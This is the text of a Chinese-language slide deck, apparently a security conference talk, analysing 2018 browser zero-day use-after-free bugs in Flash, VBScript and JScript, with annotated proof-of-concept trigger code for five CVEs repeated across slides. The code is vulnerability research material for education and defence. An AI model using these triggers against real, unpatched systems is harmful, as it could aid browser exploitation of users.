2018年浏览器脚本引擎零日漏洞
Elliot Cao
Trend Micro
2019-05-30
Whoami
• 入行之前是电气工程师
• 2017年加入趋势科技
• 沙箱开发人员
• 2018年开始研究浏览器漏洞
• 专注于浏览器脚本引擎
• Lei Cao (@elli0tn0phacker)
目录
• 2018年的浏览器零日漏洞
• VBSEmulator
• Chakra
2018年的浏览器零日漏洞
2018年的浏览器零日漏洞
• Flash:       CVE-2018-4878 CVE-2018-15982
• VBScript:  CVE-2018-8174 CVE-2018-8373
• JScript:     CVE-2018-8653
2018年的Flash零日漏洞
• CVE-2018-4878
var psdk:PSDK = PSDK.pSDK;
var psdk_dispatcher:PSDKEventDispatcher = psdk.createDispatcher();
this.mediaPlayer = psdk.createMediaPlayer(psdk_dispatcher);
this.my_DRMListerner = new DRMOperationCompleteListener ();
this.mediaPlayer.drmManager.initialize(this.my_DRMListerner);
this.my_DRMListerner = null;
try {
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
}
catch (e:Error) {
my_DRMListerner_vuln = new DRMOperationCompleteListener ();
}
2018年的Flash零日漏洞漏洞
• CVE-2018-4878
创建一个对象
var psdk:PSDK = PSDK.pSDK;
var psdk_dispatcher:PSDKEventDispatcher = psdk.createDispatcher();
this.mediaPlayer = psdk.createMediaPlayer(psdk_dispatcher);
this.my_DRMListerner = new DRMOperationCompleteListener ();
this.mediaPlayer.drmManager.initialize(this.my_DRMListerner);
this.my_DRMListerner = null;
try {
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
}
catch (e:Error) {
my_DRMListerner_vuln = new DRMOperationCompleteListener ();
}
var psdk:PSDK = PSDK.pSDK;
var psdk_dispatcher:PSDKEventDispatcher = psdk.createDispatcher();
this.mediaPlayer = psdk.createMediaPlayer(psdk_dispatcher);
this.my_DRMListerner = new DRMOperationCompleteListener ();
this.mediaPlayer.drmManager.initialize(this.my_DRMListerner);
this.my_DRMListerner = null;
try {
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
}
catch (e:Error) {
my_DRMListerner_vuln = new DRMOperationCompleteListener ();
}
2018年的Flash零日漏洞漏洞
• CVE-2018-4878
释放对象
2018年的Flash零日漏洞漏洞
• CVE-2018-4878
重用释放内存，触发GC，获得一个悬挂指针
my_DRMListerner_vuln
var psdk:PSDK = PSDK.pSDK;
var psdk_dispatcher:PSDKEventDispatcher = psdk.createDispatcher();
this.mediaPlayer = psdk.createMediaPlayer(psdk_dispatcher);
this.my_DRMListerner = new DRMOperationCompleteListener ();
this.mediaPlayer.drmManager.initialize(this.my_DRMListerner);
this.my_DRMListerner = null;
try {
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
}
catch (e:Error) {
my_DRMListerner_vuln = new DRMOperationCompleteListener ();
}
2018年的Flash零日漏洞漏洞
• CVE-2018-15982
var ba:ByteArray = new ByteArray();
var md:Metadata = new Metadata();
var arr_key:* = null;
i = 0;
while (i < 0x100) {
md.setObject(i.toString(), ba);
i++;
}
try{
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
} 
catch (e:Error){}
arr_key = md.keySet;
2018年的Flash零日漏洞漏洞
• CVE-2018-15982
var ba:ByteArray = new ByteArray();
var md:Metadata = new Metadata();
var arr_key:* = null;
i = 0;
while (i < 0x100) {
md.setObject(i.toString(), ba);
i++;
}
try{
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
} 
catch (e:Error){}
arr_key = md.keySet;
创建一些String对象
并将其保存到Metadata
2018年的Flash零日漏洞漏洞
• CVE-2018-15982
var ba:ByteArray = new ByteArray();
var md:Metadata = new Metadata();
var arr_key:* = null;
i = 0;
while (i < 0x100) {
md.setObject(i.toString(), ba);
i++;
}
try{
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
} 
catch (e:Error){}
arr_key = md.keySet;
2018年的Flash零日漏洞漏洞
• CVE-2018-15982
var ba:ByteArray = new ByteArray();
var md:Metadata = new Metadata();
var arr_key:* = null;
i = 0;
while (i < 0x100) {
md.setObject(i.toString(), ba);
i++;
}
try{
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
} 
catch (e:Error){}
arr_key = md.keySet;
触发 GC
2018年的Flash零日漏洞漏洞
• CVE-2018-15982
var ba:ByteArray = new ByteArray();
var md:Metadata = new Metadata();
var arr_key:* = null;
i = 0;
while (i < 0x100) {
md.setObject(i.toString(), ba);
i++;
}
try{
new LocalConnection().connect("foo");
new LocalConnection().connect("foo");
} 
catch (e:Error){}
arr_key = md.keySet;
得到悬挂指针
arr_key
2018年的 VBScript 零日漏洞
• CVE-2018-8174
Dim arr(1)
Dim o
Class MyClass
Private Sub Class_Terminate
Set o = arr(0)
arr(0) = &h12345678
End Sub
End Class
Set arr(0) = New MyClass
Erase arr
msgbox o
2018年的 VBScript 零日漏洞
• CVE-2018-8174
Dim arr(1)
Dim o
Class MyClass
Private Sub Class_Terminate
Set o = arr(0)
arr(0) = &h12345678
End Sub
End Class
Set arr(0) = New MyClass
Erase arr
msgbox o
创建一个MyClass对象并将其指针保存到arr（0）
2018年的 VBScript 零日漏洞
• CVE-2018-8174
Dim arr(1)
Dim o
Class MyClass
Private Sub Class_Terminate
Set o = arr(0)
arr(0) = &h12345678
End Sub
End Class
Set arr(0) = New MyClass
Erase arr
msgbox o
2018年的 VBScript 零日漏洞
• CVE-2018-8174
Dim arr(1)
Dim o
Class MyClass
Private Sub Class_Terminate
Set o = arr(0)
arr(0) = &h12345678
End Sub
End Class
Set arr(0) = New MyClass
Erase arr
msgbox o
将MyClass对象指
针保存到变量o
2018年的 VBScript 零日漏洞
• CVE-2018-8174
Dim arr(1)
Dim o
Class MyClass
Private Sub Class_Terminate
Set o = arr(0)
arr(0) = &h12345678
End Sub
End Class
Set arr(0) = New MyClass
Erase arr
msgbox o
得到一个悬挂指针
2018年的 VBScript 零日漏洞
• CVE-2018-8373
Dim arr()
ReDim arr(2)
Class MyClass
Public Default Property Get P
ReDim arr(1)
End Sub
End Class
arr(2) = New MyClass
2018年的 VBScript 零日漏洞
• CVE-2018-8373
Dim arr()
ReDim arr(2)
Class MyClass
Public Default Property Get P
ReDim arr(1)
End Sub
End Class
arr(2) = New MyClass
将arr(2)地址保存在栈中
2018年的 VBScript 零日漏洞
• CVE-2018-8373
Dim arr()
ReDim arr(2)
Class MyClass
Public Default Property Get P
ReDim arr(1)
End Sub
End Class
arr(2) = New MyClass
2018年的 VBScript 零日漏洞
• CVE-2018-8373
Dim arr()
ReDim arr(2)
Class MyClass
Public Default Property Get P
ReDim arr(1)
End Sub
End Class
arr(2) = New MyClass
原数组缓冲区将由
| ReDim |释放
2018年的 VBScript 零日漏洞
• CVE-2018-8373
Dim arr()
ReDim arr(2)
Class MyClass
Public Default Property Get P
ReDim arr(1)
End Sub
End Class
arr(2) = New MyClass
获得一个悬挂指针
2018年的 JScript 零日漏洞
• CVE-2018-8653
…
for (var i = 0; i < limit; i++) {       
var arr = new Array({prototype:{}});
var e = new Enumerator(arr);
e.moveFirst();
refs[i] = e.item();
}
for (var i = 0; i < limit; i++) {
refs[i].prototype = {};
refs[i].prototype.isPrototypeOf = getFreeRef;
}
…
dummyObj instanceof refs[0];
2018年的 JScript 零日漏洞
• CVE-2018-8653
…
for (var i = 0; i < limit; i++) {       
var arr = new Array({prototype:{}});
var e = new Enumerator(arr);
e.moveFirst();
refs[i] = e.item();
}
for (var i = 0; i < limit; i++) {
refs[i].prototype = {};
refs[i].prototype.isPrototypeOf = getFreeRef;
}
…
dummyObj instanceof refs[0];
创建一个有原型对象的对象数组
2018年的 JScript 零日漏洞
• CVE-2018-8653
…
for (var i = 0; i < limit; i++) {       
var arr = new Array({prototype:{}});
var e = new Enumerator(arr);
e.moveFirst();
refs[i] = e.item();
}
for (var i = 0; i < limit; i++) {
refs[i].prototype = {};
refs[i].prototype.isPrototypeOf = getFreeRef;
}
…
dummyObj instanceof refs[0];
将原型对象isPrototypeOf设置为| getFreeRef |回调函数
2018年的 JScript 零日漏洞
• CVE-2018-8653
…
for (var i = 0; i < limit; i++) {       
var arr = new Array({prototype:{}});
var e = new Enumerator(arr);
e.moveFirst();
refs[i] = e.item();
}
for (var i = 0; i < limit; i++) {
refs[i].prototype = {};
refs[i].prototype.isPrototypeOf = getFreeRef;
}
…
dummyObj instanceof refs[0];
调用 |getFreeRef| 回调函数
2018年的 JScript 零日漏洞
• CVE-2018-8653
function getFreeRef() {            
if (count == limit) {                      
…
for (var i = 0; i < limit; i++) {
refs[i].prototype = 0;
}
CollectGarbage();               
} else {
dummyObj instanceof refs[count++];
}            
// crash here
this;           
return false;
}
利用递归调用将 |this| 保存在栈上
2018年的 JScript 零日漏洞
• CVE-2018-8653
function getFreeRef() {            
if (count == limit) {                      
…
for (var i = 0; i < limit; i++) {
refs[i].prototype = 0;
}
CollectGarbage();               
} else {
dummyObj instanceof refs[count++];
}            
// crash here
this;           
return false;
}
跳出并通过GC释放原型对象
2018年的 JScript 零日漏洞
• CVE-2018-8653
function getFreeRef() {            
if (count == limit) {                      
…
for (var i = 0; i < limit; i++) {
refs[i].prototype = 0;
}
CollectGarbage();               